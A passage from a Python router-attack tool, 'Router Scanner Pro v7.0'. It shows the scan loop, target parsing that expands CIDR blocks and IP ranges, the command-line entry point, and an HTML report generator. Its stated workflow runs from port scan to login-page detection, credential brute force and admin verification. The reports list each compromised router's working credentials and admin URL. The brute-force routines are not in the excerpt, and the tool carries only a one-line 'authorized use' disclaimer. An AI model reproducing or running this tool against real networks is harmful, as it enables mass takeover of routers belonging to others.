        print(f"{Colors.CYAN}[*] Scanning ports: {', '.join(map(str, COMMON_PORTS))}{Colors.END}")
        print(f"{Colors.BLUE}[*] Comprehensive brand detection with session management{Colors.END}")
        print(f"{Colors.MAGENTA}[*] Organized workflow: Ports → Brand → Login → Brute Force → Admin Verification → HTML Report{Colors.END}")
        print("-" * 80)
        
        all_results = []
        
        # Process targets one by one for organized output
        for i, ip in enumerate(self.targets):
            if not running:
                break
            
            result = self.scan_single_target(ip)
            if result:
                all_results.append(result)
            
            # Update progress
            completed = i + 1
            progress = (completed / len(self.targets)) * 100
            
            print(f"{Colors.MAGENTA}[*] Progress: {completed}/{len(self.targets)} ({progress:.1f}%) - "
                  f"Login pages: {stats['login_pages_found']}, Vulnerable: {stats['vulnerable_routers']}{Colors.END}")
        
        return all_results
    
    def generate_html_report(self, results):
        """Generate HTML report with scan results"""
        try:
            html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Router Scanner Pro v7.0 - Scan Report</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto+Mono:wght@300;400;500;700&family=Source+Code+Pro:wght@300;400;500;600;700&display=swap');
        
        body {{
            font-family: 'Roboto Mono', 'Source Code Pro', 'Orbitron', monospace;
            margin: 0;
            padding: 20px;
            background: #000;
            color: #00ff00;
            overflow-x: hidden;
        }}
        
        /* Matrix rain effect */
        .matrix-bg {{
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background: #000;
        }}
        
        .matrix-rain {{
            position: absolute;
            top: -100%;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(transparent, #00ff00, transparent);
            animation: matrix-rain 3s linear infinite;
        }}
        
        @keyframes matrix-rain {{
            0% {{ top: -100%; }}
            100% {{ top: 100%; }}
        }}
        
        /* Glitch effect */
        .glitch {{
            position: relative;
            color: #00ff00;
            font-size: 2em;
            font-weight: bold;
            text-transform: uppercase;
            animation: glitch 2s infinite;
        }}
        
        @keyframes glitch {{
            0%, 100% {{ transform: translate(0); }}
            20% {{ transform: translate(-2px, 2px); }}
            40% {{ transform: translate(-2px, -2px); }}
            60% {{ transform: translate(2px, 2px); }}
            80% {{ transform: translate(2px, -2px); }}
        }}
        
        .glitch::before,
        .glitch::after {{
            content: attr(data-text);
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }}
        
        .glitch::before {{
            animation: glitch-1 0.5s infinite;
            color: #ff0000;
            z-index: -1;
        }}
        
        .glitch::after {{
            animation: glitch-2 0.5s infinite;
            color: #0000ff;
            z-index: -2;
        }}
        
        @keyframes glitch-1 {{
            0%, 100% {{ transform: translate(0); }}
            20% {{ transform: translate(2px, -2px); }}
            40% {{ transform: translate(-2px, 2px); }}
            60% {{ transform: translate(-2px, -2px); }}
            80% {{ transform: translate(2px, 2px); }}
        }}
        
        @keyframes glitch-2 {{
            0%, 100% {{ transform: translate(0); }}
            20% {{ transform: translate(-2px, 2px); }}
            40% {{ transform: translate(2px, -2px); }}
            60% {{ transform: translate(2px, 2px); }}
            80% {{ transform: translate(-2px, -2px); }}
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(0, 0, 0, 0.9);
            border: 2px solid #00ff00;
            border-radius: 10px;
            box-shadow: 0 0 30px #00ff00;
            overflow: hidden;
            position: relative;
        }}
        
        .container::before {{
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(45deg, transparent 30%, rgba(0, 255, 0, 0.1) 50%, transparent 70%);
            animation: scan 3s linear infinite;
        }}
        
        @keyframes scan {{
            0% {{ transform: translateX(-100%); }}
            100% {{ transform: translateX(100%); }}
        }}
        
        .header {{
            background: linear-gradient(135deg, #001100 0%, #003300 100%);
            color: #00ff00;
            padding: 30px;
            text-align: center;
            border-bottom: 2px solid #00ff00;
            position: relative;
        }}
        
        .header h1 {{
            margin: 0;
            font-size: 2.5em;
            text-shadow: 0 0 10px #00ff00;
            animation: pulse 2s infinite;
        }}
        
        @keyframes pulse {{
            0%, 100% {{ text-shadow: 0 0 10px #00ff00; }}
            50% {{ text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00; }}
        }}
        
        .header p {{
            margin: 10px 0 0 0;
            opacity: 0.9;
            color: #00cc00;
        }}
        .summary {{
            padding: 30px;
            background: rgba(0, 20, 0, 0.8);
            border-bottom: 2px solid #00ff00;
        }}
        
        .summary h2 {{
            color: #00ff00;
            text-shadow: 0 0 5px #00ff00;
        }}
        
        .summary-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }}
        
        .summary-card {{
            background: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border: 1px solid #00ff00;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
            transition: all 0.3s ease;
        }}
        
        .summary-card:hover {{
            box-shadow: 0 0 25px rgba(0, 255, 0, 0.6);
            transform: translateY(-2px);
        }}
        
        .summary-card h3 {{
            margin: 0 0 10px 0;
            color: #00ff00;
        }}
        
        .summary-card .number {{
            font-size: 2em;
            font-weight: bold;
            color: #00ff00;
            text-shadow: 0 0 10px #00ff00;
        }}
        .results {{
            padding: 30px;
            background: rgba(0, 10, 0, 0.8);
        }}
        
        .results h2 {{
            color: #00ff00;
            text-shadow: 0 0 5px #00ff00;
        }}
        
        .target {{
            margin-bottom: 30px;
            border: 1px solid #00ff00;
            border-radius: 8px;
            overflow: hidden;
            background: rgba(0, 0, 0, 0.8);
        }}
        
        .target-header {{
            background: rgba(0, 20, 0, 0.8);
            padding: 15px 20px;
            font-weight: bold;
            color: #00ff00;
            border-bottom: 1px solid #00ff00;
        }}
        
        .target-content {{
            padding: 20px;
            color: #00cc00;
        }}
        
        .vulnerable {{
            border-left: 5px solid #ff0000;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
        }}
        
        .safe {{
            border-left: 5px solid #00ff00;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
        }}
        .info-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
            margin-top: 15px;
        }}
        
        .info-item {{
            background: rgba(0, 0, 0, 0.8);
            padding: 10px 15px;
            border-radius: 5px;
            border-left: 3px solid #00ff00;
            color: #00cc00;
        }}
        
        .info-item strong {{
            color: #00ff00;
        }}
        
        .vulnerability {{
            background: rgba(20, 0, 0, 0.8);
            border: 1px solid #ff0000;
            border-radius: 5px;
            padding: 15px;
            margin-top: 15px;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
        }}
        
        .vulnerability h4 {{
            color: #ff0000;
            margin: 0 0 10px 0;
            text-shadow: 0 0 5px #ff0000;
        }}
        
        .vulnerability p {{
            color: #ff6666;
        }}
        
        .footer {{
            background: rgba(0, 20, 0, 0.8);
            color: #00ff00;
            padding: 20px;
            text-align: center;
            border-top: 2px solid #00ff00;
        }}
        
        .timestamp {{
            color: #00cc00;
            font-size: 0.9em;
        }}
        
        /* Matrix background */
        .matrix-bg {{
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background: #000;
        }}
        
        /* Terminal cursor effect */
        .cursor {{
            animation: blink 1s infinite;
        }}
        
        @keyframes blink {{
            0%, 50% {{ opacity: 1; }}
            51%, 100% {{ opacity: 0; }}
        }}
    </style>
</head>
<body>
    <div class="matrix-bg"></div>
    <div class="container">
        <div class="header">
            <h1 class="glitch" data-text="🔒 ROUTER SCANNER PRO v7.0">🔒 ROUTER SCANNER PRO v7.0</h1>
            <p>Comprehensive Network Security Assessment Report<span class="cursor">_</span></p>
        </div>
        
        <div class="summary">
            <h2>📊 Scan Summary</h2>
            <div class="summary-grid">
                <div class="summary-card">
                    <h3>Targets Scanned</h3>
                    <div class="number">{len(results)}</div>
                </div>
                <div class="summary-card">
                    <h3>Login Pages Found</h3>
                    <div class="number">{stats['login_pages_found']}</div>
                </div>
                <div class="summary-card">
                    <h3>Vulnerable Routers</h3>
                    <div class="number">{stats['vulnerable_routers']}</div>
                </div>
                <div class="summary-card">
                    <h3>Scan Duration</h3>
                    <div class="number">{time.time() - stats['start_time']:.1f}s</div>
                </div>
            </div>
        </div>
        
        <div class="results">
            <h2>🎯 Detailed Results</h2>
"""
            
            for result in results:
                has_vulnerabilities = len(result['vulnerabilities']) > 0
                target_class = 'vulnerable' if has_vulnerabilities else 'safe'
                
                html_content += f"""
            <div class="target {target_class}">
                <div class="target-header">
                    🎯 Target: {result['ip']}
                    {'🔒 VULNERABLE' if has_vulnerabilities else '✅ SECURE'}
                </div>
                <div class="target-content">
                    <div class="info-grid">
                        <div class="info-item">
                            <strong>Open Ports:</strong> {', '.join(map(str, result['ports'])) if result['ports'] else 'None'}
                        </div>
                        <div class="info-item">
                            <strong>Login Pages:</strong> {len(result['login_pages'])}
                        </div>
                        <div class="info-item">
                            <strong>Vulnerabilities:</strong> {len(result['vulnerabilities'])}
                        </div>
                    </div>
"""
                
                if result['login_pages']:
                    html_content += """
                    <h4>🔍 Login Pages Found:</h4>
                    <ul>
"""
                    for login_page in result['login_pages']:
                        html_content += f"""
                        <li><strong>{login_page['url']}</strong> - {login_page['auth_type']} ({login_page['brand']})</li>
"""
                    html_content += """
                    </ul>
"""
                
                if result['vulnerabilities']:
                    for vuln in result['vulnerabilities']:
                        html_content += f"""
                    <div class="vulnerability">
                        <h4>🔒 {vuln['type']}</h4>
                        <p><strong>Credentials:</strong> {vuln['credentials']}</p>
                        <p><strong>Admin URL:</strong> {vuln['admin_url']}</p>
                        <p><strong>Auth Type:</strong> {vuln['auth_type']}</p>
                        <p><strong>Verified:</strong> {'✅ Yes' if vuln['verified'] else '❌ No'}</p>
                        {f"<p><strong>Screenshot:</strong> <a href='{vuln['screenshot']}' target='_blank'>{vuln['screenshot']}</a></p>" if vuln.get('screenshot') else ""}
"""
                        
                        if vuln['router_info']:
                            html_content += """
                        <h5>📊 Router Information:</h5>
                        <div class="info-grid">
"""
                            for key, value in vuln['router_info'].items():
                                if value and value != "Unknown":
                                    html_content += f"""
                            <div class="info-item">
                                <strong>{key.replace('_', ' ').title()}:</strong> {value}
                            </div>
"""
                            html_content += """
                        </div>
"""
                        html_content += """
                    </div>
"""
                
                html_content += """
                </div>
            </div>
"""
            
            html_content += f"""
        </div>
        
        <div class="footer">
            <p>Generated by Router Scanner Pro v7.0</p>
            <p class="timestamp">Report generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p><em>For authorized security assessment only</em></p>
        </div>
    </div>
</body>
</html>
"""
            
            # Save HTML report
            report_filename = f"router_scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
            with open(report_filename, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            print(f"{Colors.GREEN}[+] HTML report generated: {report_filename}{Colors.END}")
            return report_filename
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error generating HTML report: {e}{Colors.END}")
            return None

def parse_targets(target_input):
    targets = []
    
    if '/' in target_input:  # CIDR
        import ipaddress
        network = ipaddress.IPv4Network(target_input, strict=False)
        targets = [str(ip) for ip in network.hosts()]
    elif '-' in target_input:  # IP range
        start_ip, end_ip = target_input.split('-')
        start = list(map(int, start_ip.split('.')))
        end = list(map(int, end_ip.split('.')))
        
        for a in range(start[0], end[0] + 1):
            for b in range(start[1], end[1] + 1):
                for c in range(start[2], end[2] + 1):
                    for d in range(start[3], end[3] + 1):
                        targets.append(f"{a}.{b}.{c}.{d}")
    elif target_input.endswith('.txt'):  # File
        try:
            with open(target_input, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[!] File not found: {target_input}{Colors.END}")
            return []
    else:  # Single IP
        targets = [target_input]
    
    return targets

def main():
    parser = argparse.ArgumentParser(description="Router Scanner Pro v7.0 - Comprehensive Brand Detection & Session Management")
    parser.add_argument('-t', '--targets', required=True, help='Target IP(s): single IP, CIDR, range, or file')
    parser.add_argument('-T', '--threads', type=int, default=1, help='Number of threads (default: 1 for organized output)')
    parser.add_argument('--timeout', type=int, default=6, help='Request timeout in seconds (default: 6)')
    parser.add_argument('--no-screenshot', action='store_true', help='Disable screenshot capture (default: enabled)')
    
    args = parser.parse_args()
    
    clear_screen()
    print_banner()
    
    targets = parse_targets(args.targets)
    if not targets:
        print(f"{Colors.RED}[!] No valid targets found{Colors.END}")
        return
    
    print(f"{Colors.GREEN}[+] Loaded {len(targets)} targets{Colors.END}")
    
    enable_screenshot = not args.no_screenshot
    if enable_screenshot and not SCREENSHOT_AVAILABLE:
        print(f"{Colors.YELLOW}[!] Screenshot libraries not available. Install selenium and chromedriver for screenshot functionality.{Colors.END}")
        enable_screenshot = False
    
    scanner = RouterScannerPro(targets, args.threads, args.timeout, enable_screenshot)
    stats['start_time'] = time.time()
    
    try:
        results = scanner.run_scan()
        
        if results:
            total_time = time.time() - stats['start_time']
            
            print(f"\n{Colors.GREEN}{'='*60}{Colors.END}")
            print(f"{Colors.GREEN}[+] SCAN COMPLETE!{Colors.END}")
            print(f"{Colors.GREEN}{'='*60}{Colors.END}")
            print(f"{Colors.YELLOW}[*] Summary:{Colors.END}")
            print(f"  - Total targets scanned: {len(results)}")
            print(f"  - Login pages found: {stats['login_pages_found']}")
            print(f"  - Vulnerable routers: {stats['vulnerable_routers']}")
            if stats['vulnerable_routers']:
                print("  - Vulnerable list:")
                for res in results:
                    if res.get('vulnerabilities'):
                        v = res['vulnerabilities'][0]
                        print(f"    • {res['ip']} -> {v['credentials']}")
            print(f"  - Scan duration: {total_time:.1f} seconds")
            print(f"  - Average speed: {len(results)/total_time:.1f} targets/second")
            print(f"{Colors.BLUE}[*] Advanced detection and verification completed successfully{Colors.END}")
            
            # Generate HTML report
            print(f"{Colors.CYAN}[*] Generating HTML report...{Colors.END}")
            report_file = scanner.generate_html_report(results)
            if report_file:
                print(f"{Colors.GREEN}[+] Report saved: {report_file}{Colors.END}")
            
        else:
            print(f"{Colors.RED}[!] No results to report{Colors.END}")
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error during scan: {e}{Colors.END}")

if __name__ == "__main__":
    main()